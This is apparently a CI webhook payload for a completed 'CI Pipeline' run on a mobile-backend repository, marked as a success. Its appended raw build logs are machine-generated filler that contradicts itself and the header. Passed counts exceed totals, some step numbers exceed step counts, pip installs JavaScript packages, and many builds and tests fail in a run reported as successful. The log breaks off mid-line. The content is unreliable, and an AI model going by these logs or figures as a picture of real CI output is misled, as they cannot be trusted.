{
  "action": "completed",
  "workflow_run": {
    "id": 660,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "68f5aae8378b287d101695aa543afc4426d24bc0",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-12T12:19:30.622788Z",
    "updated_at": "2025-12-12T12:21:54.052056Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: build ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGET /api - 200 (4ms)\nStep 15/18: Linting\npip: Downloading jest-5.10.tar.gz\n[12:19:30] DEBUG: Connection pool: 16 active\nCompleted.\n\u2717 build failed with exit code 98\n\u2713 Task completed in 3428ms\nCompiling utils/utils.go...\nHEAD is now at c604cb8\nBundling runtime.css\nFinished.\nCache invalidated: node_modules\nStep 14/23: Running migrations\n[12:19:30] INFO: Starting build process\nPulling image: alpine:18\nCompiling utils/index.js...\nCompiling utils/handler.rs...\nLoading...\nStep 6/19: Building\nChecking out develop branch\nBuilding Docker image...\n[12:19:30] INFO: Starting build process\nArtifact uploaded: build.tar.gz (15MB)\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnecting to example.com:443...\nWARNING: lodash has known vulnerabilities\nTLS handshake completed\nLoading...\nUsing Python 3.12\nException: RuntimeError\nOptimizing 34 modules...\n\u2713 All checks passed\nBundling main.js\nTime: 7.920s\nBuilding Docker image...\nAlready up to date.\nLayer 3/13: ENV command\n[12:19:30] DEBUG: Connection pool: 8 active\n[12:19:30] DEBUG: Memory usage: 1859MB\nEnvironment: production\nWARNING: react has known vulnerabilities\nTLS handshake completed\n  PASS: unit/test_db_connect.spec.js\nCompiling components/handler.rs...\nArtifact downloaded: 27MB\n[12:19:30] WARN: Deprecated API usage\n  PASS: integration/test_auth_login.spec.js\n[12:19:30] DEBUG: Initializing service\nOptimizing 12 modules...\n[12:19:30] INFO: Cache refreshed\n  PASS: test_api_health (453ms)\nWARNING: webpack has known vulnerabilities\nCompleted.\nLayer 4/14: RUN command\n[12:19:30] INFO: Connecting to database\nImage pulled successfully\nPushing to registry...\n[12:19:30] DEBUG: Query executed in 19ms\n[12:19:30] INFO: Connecting to database\n[12:19:30] WARN: Deprecated API usage\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nException: ValueError\nCompiling utils/app.ts...\nNODE_ENV=production\nAlready up to date.\nNODE_ENV=development\nChecking out develop branch\nLayer 10/14: RUN command\nStep 16/16: Linting\n[12:19:30] DEBUG: Query executed in 42ms\nTests: 390 passed, 445 total\nnpm install: resolved 1053 packages\n\u2713 lint completed\nArtifact downloaded: 5MB\nPlatform: win32-x64\nConnecting to cloud.services:443...\nCache invalidated: build\nTest Suites: 13 passed, 32 total\n\u2713 build completed\nUsing Python 3.11\nTLS handshake completed\nnpm install: added 260 packages\nCompiling utils/handler.rs...\nTests: 455 passed, 483 total\n[12:19:30] DEBUG: Connection pool: 14 active\nCompleted.\nGenerating source maps...\nSnapshots: 23 passed, 32 total\n[12:19:30] INFO: Request completed\nArtifact uploaded: build.tar.gz (26MB)\nBundling runtime.css\npip install: Successfully installed express-4.8\n  PASS: test_user_create (310ms)\n[12:19:30] INFO: Starting build process\nImage pulled successfully\nNODE_ENV=test\nDone.\nUsing Node.js 17.5.0\nLayer 6/15: COPY command\n[12:19:30] INFO: Request completed\nOptimizing 89 modules...\nSuccess!\nArtifact downloaded: 32MB\nWARNING: jest has known vulnerabilities\n[12:19:30] INFO: Processing request\nFinished.\npip: Collecting express\nWaiting...\nChecking out develop branch\nChecking out main branch\nStep 10/19: Testing\nGenerating source maps...\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (43MB)\nGenerating source maps...\n[12:19:30] INFO: Starting build process\n[12:19:30] DEBUG: Memory usage: 170MB\nnpm install: added 129 packages\nArtifact uploaded: dist.zip (45MB)\n[12:19:30] DEBUG: Connection pool: 16 active\nFinished.\nUploading artifact 'build' (30 files)\nWARNING: prettier has known vulnerabilities\n[12:19:30] DEBUG: Query executed in 31ms\nLayer 6/11: ENV command\nCreating production build...\nCompiling components/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at 10c7c90\nArtifact uploaded: build.tar.gz (50MB)\nTest Suites: 46 passed, 39 total\nArtifact downloaded: 16MB\n=== Step build completed ===\n=== Step: checkout ===\nCreating production build...\nSwitched to branch 'feature/task-292'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:30] INFO: Request completed\nnpm notice: package.json updated\nCompiling utils/service.java...\nRan 144 tests in 28s\nAlready up to date.\n[12:19:30] DEBUG: Query executed in 30ms\nCreating production build...\nTests: 195 passed, 417 total\nProcessing...\nDone.\nOK\npip: Installing build dependencies...\n[12:19:30] DEBUG: Loading configuration\nGET /status - 201 (66ms)\nException: NullPointerException\nUploading artifact 'dist' (45 files)\nLoading...\nCache saved successfully\nStep 19/21: Building\n  PASS: e2e/test_db_connect.spec.js\nPlatform: linux-x64\nFinished.\nPlatform: win32-x64\nLoading...\nWaiting...\nSnapshots: 27 passed, 34 total\nLoading...\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (11MB)\npip: Installing build dependencies...\nSnapshots: 4 passed, 31 total\nCoverage: 74% statements, 97% branches\n[12:19:30] INFO: Connecting to database\nLoading...\nLoading...\n[12:19:30] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_user_create\nOptimizing 79 modules...\nStep 3/18: Running migrations\nUploading artifact 'build' (6 files)\nNODE_ENV=development\nSwitched to branch 'feature/task-358'\nException: RuntimeError\nBundling styles.css\nTests: 250 passed, 178 total\nTime: 16.349s\nOptimizing 48 modules...\nTime: 51.904s\nArtifact uploaded: build.tar.gz (32MB)\nCompiling components/service.java...\nDone.\n[12:19:30] DEBUG: Query executed in 71ms\nnpm install: added 295 packages\nReady.\nStep 15/22: Running migrations\nWARNING: express has known vulnerabilities\nInstalling express@4.11.10\nRan 157 tests in 39s\n[12:19:30] INFO: Cache refreshed\nLayer 10/8: COPY command\n[12:19:30] INFO: Cache refreshed\nGenerating source maps...\nInstalling prettier@4.14.0\nStep 8/24: Running migrations\npip: Installing build dependencies...\n[12:19:30] WARN: Deprecated API usage\nArtifact downloaded: 16MB\nWaiting...\npip install: Successfully installed webpack-3.2\n[12:19:30] INFO: Connecting to database\nNODE_ENV=test\nConnecting to example.com:443...\nFAILED: test_auth_login\nStep 9/17: Linting\nTLS handshake completed\nStep 16/21: Testing\nOK\nPlatform: linux-x64\nArtifact downloaded: 23MB\nCoverage: 90% statements, 85% branches\nLoading...\nSuccess!\nChecking out main branch\nCompiling utils/app.ts...\nRan 64 tests in 3s\n\u2713 All checks passed\n[12:19:30] ERROR: Connection failed\n[12:19:30] WARN: Deprecated API usage\nCompiling utils/app.ts...\nnpm notice: created a lockfile\nGenerating source maps...\nAlready up to date.\nMinifying main.js\nArtifact downloaded: 45MB\nCache saved successfully\nTransforming 422 files...\nAlready up to date.\nArtifact uploaded: dist.zip (20MB)\nSwitched to branch 'bugfix/task-789'\nUsing Python 3.9\nyarn add: Done in 24.55s\nLayer 8/13: COPY command\nCache hit for key-6479\nCache restored successfully (178MB)\nnpm install: added 158 packages\nNODE_ENV=development\nOK\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 package completed\nSuccess!\nPushing to registry...\n[12:19:30] INFO: Starting build process\nnpm notice: package.json updated\nDone.\nStep 18/23: Building\n[12:19:30] WARN: Deprecated API usage\n[12:19:30] DEBUG: Query executed in 80ms\npip: Collecting jest\nPulling image: python:18\nTests: 302 passed, 257 total\nnpm install: added 132 packages\nStep 16/22: Linting\nEnvironment: staging\n\u2713 build completed\n[12:19:30] INFO: Starting build process\nSwitched to branch 'hotfix/task-821'\nCache hit for key-8304\nPOST /data - 200 (176ms)\nStep 16/20: Building\nTests: 146 passed, 356 total\nTests: 152 passed, 120 total\nEnvironment: development\nConnecting to acme.corp:443...\n=== Step checkout completed ===\n=== Step: deploy_production ===\nCreating production build...\n[12:19:30] INFO: Connecting to database\n[12:19:30] INFO: Cache refreshed\n[12:19:30] DEBUG: Memory usage: 1110MB\n[12:19:30] WARN: Deprecated API usage\nCreating production build...\nCache hit for key-1246\nnpm notice: created a lockfile\nSnapshots: 47 passed, 0 total\nCache hit for key-2736\nCache hit for key-9019\nBundling main.css\nUsing Python 3.11\nTransforming 865 files...\nCache hit for key-6765\n[12:19:30] DEBUG: Memory usage: 819MB\n  PASS: test_cache_hit (22ms)\nLayer 5/10: COPY command\nUploading artifact 'build' (10 files)\n[12:19:30] DEBUG: Query executed in 71ms\n[12:19:30] WARN: Deprecated API usage\n\u2713 test completed\n\u2717 build failed with exit code 122\n[12:19:30] DEBUG: Loading configuration\n[12:19:30] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_user_create\n  PASS: unit/test_cache_hit.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: integration/test_db_connect.spec.js\nAlready up to date.\npip: Downloading prettier-3.5.tar.gz\nDone.\nFAILED: test_db_connect\nCache restored successfully (248MB)\nProcessing...\nGenerating source maps...\nStep 9/18: Running migrations\nBuilding Docker image...\nCache invalidated: node_modules\nCompiling components/handler.rs...\npip: Downloading express-3.1.tar.gz\nStep 6/19: Testing\nWARNING: express has known vulnerabilities\nnpm notice: package.json updated\nSuccess!\nChecking out master branch\nTransforming 507 files...\nBundling runtime.js\nMinifying main.js\n[12:19:30] INFO: Request completed\n[12:19:30] DEBUG: Connection pool: 10 active\nConnecting to startup.dev:443...\nNODE_ENV=production\nAlready up to date.\nSnapshots: 41 passed, 24 total\n\u2713 All checks passed\nUsing Python 3.12\nLayer 5/15: COPY command\nUsing Node.js 20.7.8\n\u2713 All checks passed\nnpm notice: package.json updated\nStep 13/19: Installing dependencies\nStep 7/23: Linting\nTests: 166 passed, 313 total\nStep 15/17: Deploying\n[12:19:30] INFO: Connecting to database\nReady.\nArtifact uploaded: build.tar.gz (29MB)\nReady.\nLayer 2/9: RUN command\n[12:19:30] INFO: Request completed\nCompiling components/utils.go...\nStep 5/18: Deploying\nFAILED: test_db_connect\nyarn add: Done in 5.69s\n[12:19:30] INFO: Request completed\n\u2713 All checks passed\npip: Installing build dependencies...\nCoverage: 71% statements, 70% branches\nPlatform: win32-x64\nUsing Python 3.11\nReady.\nPOST /data - 201 (488ms)\nHEAD is now at 1819067\n\u2717 build failed with exit code 98\nStep 10/19: Deploying\nCompiling lib/service.java...\nArtifact uploaded: build.tar.gz (40MB)\nInstalling jest@4.13.3\n\u2717 build failed with exit code 92\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\nGET /status - 204 (63ms)\nFetching submodules...\nProcessing...\n\u2713 Step 'build' succeeded\nCompiling utils/index.js...\nChecking out main branch\nImage pulled successfully\npip: Installing build dependencies...\nStep 8/25: Running migrations\nnpm install: added 317 packages\nStep 1/20: Testing\nAlready up to date.\n[12:19:30] INFO: Connecting to database\nGenerating source maps...\nMinifying vendor.js\nCache restored successfully (398MB)\nCompiling src/index.js...\nnpm notice: package.json updated\npip: Downloading prettier-4.9.tar.gz\nNODE_ENV=test\nPlatform: linux-x64\nnpm install: added 417 packages\nCreating production build...\n\u2713 package completed\n[12:19:30] INFO: Cache refreshed\nAlready up to date.\n[12:19:30] DEBUG: Connection pool: 2 active\nUploading artifact 'coverage' (27 files)\nWARNING: webpack has known vulnerabilities\nCreating production build...\nOptimizing 69 modules...\nNODE_ENV=development\n[12:19:30] INFO: Request completed\nUsing Node.js 14.12.0\nWARNING: webpack has known vulnerabilities\nCreating production build...\nDone.\nRan 172 tests in 52s\nCompiling lib/app.ts...\nLoading...\nFAILED: test_cache_hit\n[12:19:30] WARN: Deprecated API usage\nGET /status - 201 (38ms)\nPlatform: darwin-arm64\n=== Step deploy_production completed ===\n=== Step: save_cache ===\n\u2713 All checks passed\nUsing Node.js 16.5.4\nEnvironment: development\n\u2713 Task completed in 2246ms\n[12:19:30] INFO: Connecting to database\nCache invalidated: node_modules\nStep 11/23: Deploying\n[12:19:30] INFO: Cache refreshed\nStep 15/21: Building\nCoverage: 87% statements, 83% branches\nFinished.\nEnvironment: test\nUsing Node.js 14.17.7\nWaiting...\n[12:19:30] INFO: Starting build process\nStep 8/23: Deploying\npip install: Successfully installed react-3.19\nCompiling src/service.java...\n\u2713 Step 'test' succeeded\n[12:19:30] DEBUG: Initializing service\nImage pulled successfully\n\u2717 build failed with exit code 21\nnpm notice: package.json updated\nHEAD is now at e70e4d1\nTest Suites: 42 passed, 6 total\nStep 8/23: Running migrations\n[12:19:30] INFO: Processing request\n[12:19:30] INFO: Cache refreshed\nStep 7/22: Running migrations\nBuilding Docker image...\n  PASS: test_db_connect (225ms)\n[12:19:30] INFO: Processing request\nEnvironment: development\nCache miss for key-2525\nCoverage: 100% statements, 79% branches\nImage pulled successfully\nStep 14/25: Linting\nCache invalidated: node_modules\n[12:19:30] INFO: Processing request\nLoading...\nTests: 413 passed, 302 total\nRan 47 tests in 14s\nUploading artifact 'dist' (10 files)\nHEAD is now at 3c324bd\n[12:19:30] DEBUG: Query executed in 19ms\nStep 3/15: Building\nChecking out develop branch\nArtifact downloaded: 35MB\nStep 18/22: Testing\nArtifact uploaded: dist.zip (81MB)\n[12:19:30] INFO: Starting build process\nImage pulled successfully\nSnapshots: 24 passed, 26 total\nAlready up to date.\n[12:19:30] WARN: Deprecated API usage\nStep 13/20: Running migrations\nArtifact downloaded: 17MB\nnpm install: added 495 packages\nSuccess!\nCache hit for key-4093\nSwitched to branch 'feature/task-217'\nReady.\n[12:19:30] WARN: Deprecated API usage\nReady.\npip: Collecting express\nLayer 7/10: COPY command\n\u2713 lint completed\nGenerating source maps...\nException: ValueError\n\u2713 All checks passed\nTime: 47.37s\nBundling runtime.js\nInstalling lodash@2.9.4\n[12:19:30] WARN: Deprecated API usage\nPulling image: node:3.11\n[12:19:30] WARN: Deprecated API usage\n\u2717 build failed with exit code 32\nCache miss for key-4147\nChecking out develop branch\nCompiling utils/utils.go...\nStep 10/24: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: python:18\nUploading artifact 'dist' (17 files)\nLayer 7/10: COPY command\nUsing Python 3.12\nOK\nException: NullPointerException\n\u2717 build failed with exit code 56\nImage pulled successfully\nStep 14/23: Running migrations\n[12:19:30] INFO: Connecting to database\nCreating production build...\n[12:19:30] INFO: Starting build process\nSnapshots: 25 passed, 32 total\nLayer 1/9: RUN command\nEnvironment: staging\nnpm install: added 38 packages\n[12:19:30] INFO: Starting build process\nStep 1/21: Running migrations\n[12:19:30] INFO: Request completed\nCoverage: 89% statements, 81% branches\nnpm notice: package.json updated\n\u2713 Step 'install' succeeded\nArtifact downloaded: 4MB\n[12:19:30] WARN: Deprecated API usage\nBundling runtime.css\nCache saved successfully\nCache saved successfully\nnpm install: resolved 372 packages\nInstalling prettier@3.19.4\nRan 127 tests in 51s\nFetching submodules...\nCompiling utils/service.java...\nProcessing...\n[12:19:30] DEBUG: Initializing service\nConnecting to cloud.services:443...\nBundling vendor.js\npip: Collecting eslint\n\u2713 Step 'test' succeeded\nDone.\nnpm install: added 303 packages\nArtifact downloaded: 28MB\n[12:19:30] INFO: Processing request\nAlready up to date.\nEnvironment: staging\nBundling styles.css\nnpm install: added 378 packages\n[12:19:30] WARN: Deprecated API usage\n[12:19:30] WARN: Deprecated API usage\nUsing Node.js 15.2.7\nWARNING: webpack has known vulnerabilities\n  PASS: test_user_create (386ms)\nOK\nReady.\nTests: 256 passed, 275 total\nCoverage: 100% statements, 75% branches\n=== Step save_cache completed ===\n=== Step: integration_tests ===\nWARNING: express has known vulnerabilities\nnpm install: added 490 packages\nInstalling prettier@3.3.5\nDone.\nProcessing...\nUploading artifact 'build' (44 files)\nCreating production build...\nnpm install: resolved 993 packages\n[12:19:30] WARN: Deprecated API usage\nTLS handshake completed\nProcessing...\nPulling image: python:3.11\nRan 185 tests in 41s\nLayer 8/8: ENV command\n[12:19:30] INFO: Request completed\nConnection established\nTest Suites: 21 passed, 29 total\nArtifact uploaded: dist.zip (80MB)\nReady.\nStep 5/21: Linting\nAlready up to date.\npip: Installing build dependencies...\n[12:19:30] INFO: Cache refreshed\nOptimizing 81 modules...\nStep 7/23: Building\nSnapshots: 46 passed, 13 total\nCompiling components/index.js...\nLoading...\nVerifying...\nTransforming 881 files...\nConnection established\nConnection established\nArtifact uploaded: dist.zip (51MB)\n\u2713 Task completed in 2257ms\nBuilding Docker image...\nPOST /data - 202 (154ms)\nSuccess!\n\u2717 build failed with exit code 70\nCompiling components/utils.go...\nDone.\nCompiling components/index.js...\npip: Downloading jest-4.6.tar.gz\npip install: Successfully installed express-5.2\nLayer 2/11: RUN command\n\u2713 All checks passed\nBundling main.css\nFAILED: test_auth_login\nCreating production build...\npip: Installing build dependencies...\nTransforming 387 files...\n\u2713 lint completed\n[12:19:30] WARN: Deprecated API usage\nCache hit for key-7583\nCompleted.\nStep 8/16: Linting\n[12:19:30] DEBUG: Memory usage: 1037MB\nImage pulled successfully\nCache miss for key-5070\nAlready up to date.\nPlatform: win32-x64\npip: Downloading react-3.3.tar.gz\nPulling image: alpine:3.11\nGenerating source maps...\nMinifying main.js\nCache saved successfully\n[12:19:30] WARN: Deprecated API usage\n[12:19:30] INFO: Cache refreshed\nCache hit for key-2143\npip: Collecting eslint\nLayer 6/13: RUN command\nSwitched to branch 'feature/task-788'\nBundling runtime.css\nTime: 70.727s\n[12:19:30] INFO: Processing request\n\u2713 Step 'checkout' succeeded\nStep 6/19: Testing\nPlatform: win32-x64\nStep 20/25: Linting\n[12:19:30] DEBUG: Memory usage: 568MB\nImage pulled successfully\nLoading...\nCompiling lib/handler.rs...\nCompiling lib/app.ts...\n[12:19:30] INFO: Request completed\n\u2713 All checks passed\nCache hit for key-5644\n[12:19:30] ERROR: Connection failed\nSnapshots: 7 passed, 10 total\nWARNING: eslint has known vulnerabilities\nTransforming 714 files...\nStep 15/25: Installing dependencies\nDone.\nPulling image: python:latest\nCache invalidated: build\nConnection established\nRan 149 tests in 20s\n\u2717 build failed with exit code 111\nCache restored successfully (415MB)\nCompiling lib/index.js...\n[12:19:30] DEBUG: Loading configuration\n[12:19:30] DEBUG: Initializing service\nStep 6/17: Building\nyarn add: Done in 2.3s\nTLS handshake completed\nConnection established\n[12:19:30] DEBUG: Initializing service\nCompiling lib/app.ts...\npip: Downloading lodash-5.14.tar.gz\nStep 11/23: Installing dependencies\nMinifying app.js\nCache miss for key-2102\nStep 13/16: Testing\nUploading artifact 'build' (2 files)\nPulling image: python:18\nTests: 75 passed, 411 total\n[12:19:30] DEBUG: Query executed in 73ms\nnpm install: resolved 1061 packages\n[12:19:30] INFO: Starting build process\nCoverage: 96% statements, 83% branches\n[12:19:30] DEBUG: Connection pool: 6 active\nNODE_ENV=test\nCompiling src/index.js...\nyarn add: Done in 21.14s\nGET /health - 204 (77ms)\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 Task completed in 1487ms\nArtifact downloaded: 36MB\nCreating production build...\nGET /health - 201 (88ms)\n[12:19:30] INFO: Starting build process\nCompiling components/index.js...\nImage pulled successfully\npip install: Successfully installed react-4.4\nVerifying...\nSwitched to branch 'hotfix/task-569'\nBundling styles.js\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nProcessing...\n\u2713 build completed\npip install: Successfully installed react-1.12\nDone.\n\u2713 Task completed in 2996ms\nReady.\npip: Downloading prettier-3.11.tar.gz\nPOST /data - 200 (341ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\nEnvironment: development\nLayer 8/13: COPY command\nCache miss for key-1439\nVerifying...\nSwitched to branch 'feature/task-954'\nCache saved successfully\nWARNING: eslint has known vulnerabilities\npip: Installing build dependencies...\n  PASS: test_cache_hit (333ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (47MB)\nCache hit for key-7062\nStep 8/21: Testing\nFAILED: test_api_health\nException: TypeError\nSnapshots: 40 passed, 28 total\nVerifying...\nStep 9/17: Building\n\u2717 build failed with exit code 96\nFinished.\nCache miss for key-1466\nArtifact downloaded: 24MB\nMinifying vendor.js\nSnapshots: 19 passed, 47 total\nCompiling components/service.java...\n[12:19:30] ERROR: Connection failed\nConnecting to test.io:443...\nCache miss for key-3785\nPushing to registry...\nStep 3/16: Linting\nLoading...\nCache invalidated: dependencies\n[12:19:30] WARN: Deprecated API usage\nCreating production build...\nSuccess!\nCompiling src/main.py...\n[12:19:30] INFO: Starting build process\nWaiting...\nStep 12/21: Installing dependencies\nCompiling src/utils.go...\nGenerating source maps...\nImage pulled successfully\nAlready up to date.\n[12:19:30] INFO: Starting build process\n[12:19:30] INFO: Cache refreshed\n[12:19:30] INFO: Cache refreshed\nFAILED: test_api_health\npip: Downloading express-3.16.tar.gz\nAlready up to date.\nStep 11/19: Deploying\n[12:19:30] DEBUG: Connection pool: 1 active\nCompiling src/utils.go...\n[12:19:30] DEBUG: Memory usage: 240MB\n[12:19:30] DEBUG: Connection pool: 14 active\n[12:19:30] INFO: Connecting to database\nDone.\nPulling image: alpine:18\nUsing Python 3.10\nnpm notice: package.json updated\nGET /api - 201 (12ms)\nStep 10/15: Running migrations\nyarn add: Done in 9.60s\nChecking out main branch\nEnvironment: production\n[12:19:30] ERROR: Connection failed\nCache miss for key-1581\n[12:19:30] INFO: Request completed\nCompiling src/index.js...\nCompleted.\nnpm notice: package.json updated\n[12:19:30] INFO: Request completed\nWaiting...\n[12:19:30] DEBUG: Connection pool: 8 active\nCompiling lib/service.java...\nCreating production build...\nMinifying main.js\nnpm install: added 438 packages\nCache saved successfully\nStep 15/15: Deploying\nNODE_ENV=production\nPushing to registry...\nArtifact uploaded: dist.zip (19MB)\n[12:19:30] WARN: Deprecated API usage\nSnapshots: 48 passed, 44 total\nStep 17/24: Linting\nnpm notice: package.json updated\nTests: 364 passed, 406 total\nEnvironment: staging\nChecking out master branch\nProcessing...\nUsing Python 3.12\nBuilding Docker image...\npip: Collecting jest\n\u2713 All checks passed\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nStep 17/21: Testing\n[12:19:30] INFO: Processing request\n[12:19:30] DEBUG: Query executed in 35ms\nCompiling utils/app.ts...\nConnection established\nMinifying app.js\n[12:19:30] DEBUG: Initializing service\nCache miss for key-9849\n\u2713 Step 'test' succeeded\nChecking out main branch\nTests: 282 passed, 486 total\nCache saved successfully\nLoading...\nLayer 9/13: RUN command\n\u2713 All checks passed\n[12:19:30] INFO: Connecting to database\nTest Suites: 11 passed, 19 total\n[12:19:30] DEBUG: Connection pool: 4 active\nFinished.\n[12:19:30] INFO: Cache refreshed\nPlatform: linux-x64\n[12:19:30] INFO: Request completed\n[12:19:30] INFO: Cache refreshed\nFetching submodules...\nFinished.\nOptimizing 100 modules...\n[12:19:30] DEBUG: Memory usage: 1207MB\nStep 16/23: Installing dependencies\nOptimizing 31 modules...\n=== Step unit_tests completed ===\n=== Step: install_dependencies ===\nTransforming 577 files...\nConnection established\nWARNING: prettier has known vulnerabilities\nCompiling src/service.java...\n[12:19:30] DEBUG: Connection pool: 17 active\n[12:19:30] DEBUG: Connection pool: 14 active\nException: TypeError\n  PASS: e2e/test_user_create.spec.js\nCreating production build...\nSuccess!\nSwitched to branch 'feature/task-851'\nnpm notice: created a lockfile\nPOST /upload - 202 (383ms)\n[12:19:30] DEBUG: Loading configuration\nStep 7/24: Testing\nUsing Python 3.12\n[12:19:30] INFO: Processing request\n[12:19:30] WARN: Deprecated API usage\nImage pulled successfully\n[12:19:30] DEBUG: Loading configuration\n[12:19:30] WARN: Deprecated API usage\nAlready up to date.\nGET /api - 204 (98ms)\nMinifying app.js\nLayer 4/8: RUN command\nArtifact downloaded: 12MB\nTime: 16.59s\nTests: 54 passed, 440 total\n[12:19:30] DEBUG: Connection pool: 17 active\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:30] DEBUG: Connection pool: 17 active\n\u2713 Task completed in 3192ms\nImage pulled successfully\nArtifact uploaded: dist.zip (87MB)\nCompiling utils/app.ts...\n  PASS: unit/test_db_connect.spec.js\nCompiling components/service.java...\nCache hit for key-2105\nStep 20/23: Linting\nFinished.\nTest Suites: 33 passed, 46 total\n[12:19:30] INFO: Starting build process\n[12:19:30] ERROR: Connection failed\nCache saved successfully\nCache hit for key-2680\n[12:19:30] INFO: Cache refreshed\nDone.\nException: NullPointerException\n  PASS: integration/test_user_create.spec.js\nnpm install: resolved 826 packages\nCoverage: 72% statements, 80% branches\n[12:19:30] DEBUG: Connection pool: 13 active\n[12:19:30] INFO: Processing request\nStep 8/16: Linting\nCache hit for key-8851\n[12:19:30] DEBUG: Initializing service\nCompiling utils/main.py...\nRan 120 tests in 33s\nnpm notice: created a lockfile\n\u2713 All checks passed\nCreating production build...\nException: ValueError\nFetching submodules...\nCache hit for key-7408\nFAILED: test_cache_hit\n[12:19:30] INFO: Processing request\nnpm notice: package.json updated\nSuccess!\nStep 5/16: Installing dependencies\nNODE_ENV=test\nCoverage: 81% statements, 78% branches\n\u2713 test completed\n[12:19:30] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-996'\nTransforming 466 files...\nRan 29 tests in 11s\nSnapshots: 17 passed, 9 total\nEnvironment: test\n\u2713 Step 'build' succeeded\nLayer 6/9: RUN command\n[12:19:30] DEBUG: Initializing service\nUsing Node.js 19.1.8\nTransforming 646 files...\nOptimizing 39 modules...\nArtifact uploaded: dist.zip (65MB)\n[12:19:30] INFO: Request completed\nTransforming 296 files...\nTest Suites: 12 passed, 31 total\n\u2713 Task completed in 3187ms\nVerifying...\nnpm install: resolved 459 packages\nChecking out develop branch\nCache hit for key-2627\nStep 10/20: Deploying\nUsing Python 3.10\nCache miss for key-3974\nSuccess!\n[12:19:30] INFO: Starting build process\n[12:19:30] INFO: Cache refreshed\nUploading artifact 'dist' (18 files)\n[12:19:30] DEBUG: Loading configuration\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (10MB)\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\nWARNING: prettier has known vulnerabilities\nAlready up to date.\n\u2717 build failed with exit code 54\nSwitched to branch 'feature/task-987'\nCache miss for key-6426\nCompiling utils/handler.rs...\nCache invalidated: dependencies\nMinifying app.js\nGenerating source maps...\n\u2717 build failed with exit code 100\nUploading artifact 'coverage' (43 files)\nTLS handshake completed\npip: Collecting axios\n[12:19:30] WARN: Deprecated API usage\nTest Suites: 8 passed, 22 total\n[12:19:30] WARN: Deprecated API usage\nRan 191 tests in 46s\n[12:19:30] WARN: Deprecated API usage\nCompiling utils/app.ts...\nPlatform: win32-x64\nMinifying app.js\nTransforming 938 files...\nImage pulled successfully\n[12:19:30] INFO: Processing request\n\u2713 Step 'install' succeeded\nConnecting to startup.dev:443...\nNODE_ENV=test\n[12:19:30] DEBUG: Query executed in 49ms\n[12:19:30] DEBUG: Query executed in 18ms\n=== Step install_dependencies completed ===\n=== Step: type_check ===\npip: Collecting eslint\nTransforming 549 files...\nMinifying app.js\n\u2713 All checks passed\npip install: Successfully installed lodash-1.20\npip: Collecting prettier\nCache miss for key-1482\nCompiling lib/service.java...\nCoverage: 87% statements, 78% branches\n\u2713 Task completed in 1789ms\nCoverage: 75% statements, 75% branches\nPushing to registry...\n\u2717 build failed with exit code 107\nPOST /data - 200 (87ms)\n[12:19:30] INFO: Request completed\nWARNING: eslint has known vulnerabilities\n[12:19:30] DEBUG: Query executed in 42ms\nTime: 68.614s\nnpm install: added 290 packages\nnpm notice: created a lockfile\n[12:19:30] INFO: Connecting to database\nTime: 15.36s\n[12:19:30] DEBUG: Loading configuration\nStep 9/25: Deploying\n[12:19:30] DEBUG: Query executed in 37ms\nImage pulled successfully\nGenerating source maps...\nBundling styles.js\nArtifact uploaded: dist.zip (80MB)\nGET /status - 201 (60ms)\nWaiting...\n[12:19:30] INFO: Cache refreshed\nVerifying...\nOptimizing 47 modules...\nFAILED: test_auth_login\npip: Downloading prettier-1.2.tar.gz\nWaiting...\nStep 8/22: Testing\nTest Suites: 24 passed, 9 total\nMinifying main.js\nFetching submodules...\nStep 19/17: Building\n[12:19:30] DEBUG: Initializing service\nPulling image: python:3.11\nOptimizing 93 modules...\n\u2713 validate completed\nCache miss for key-9079\nNODE_ENV=production\n[12:19:30] INFO: Processing request\nnpm notice: package.json updated\nSnapshots: 6 passed, 24 total\nStep 10/20: Installing dependencies\npip: Collecting express\nRan 142 tests in 28s\nChecking out master branch\nWARNING: lodash has known vulnerabilities\nFAILED: test_db_connect\nConnection established\nWaiting...\nNODE_ENV=test\nCoverage: 86% statements, 99% branches\nGenerating source maps...\nOptimizing 63 modules...\npip install: Successfully installed lodash-1.20\n[12:19:30] ERROR: Connection failed\npip: Collecting react\nBuilding Docker image...\nStep 17/16: Linting\nPOST /data - 200 (369ms)\nArtifact uploaded: dist.zip (44MB)\n  PASS: test_cache_hit (263ms)\nCache saved successfully\npip: Installing build dependencies...\nFetching submodules...\nProcessing...\n\u2713 All checks passed\n[12:19:30] WARN: Deprecated API usage\nCoverage: 89% statements, 92% branches\npip: Collecting prettier\nBundling main.css\nCache saved successfully\n[12:19:30] DEBUG: Connection pool: 5 active\nFinished.\nyarn add: Done in 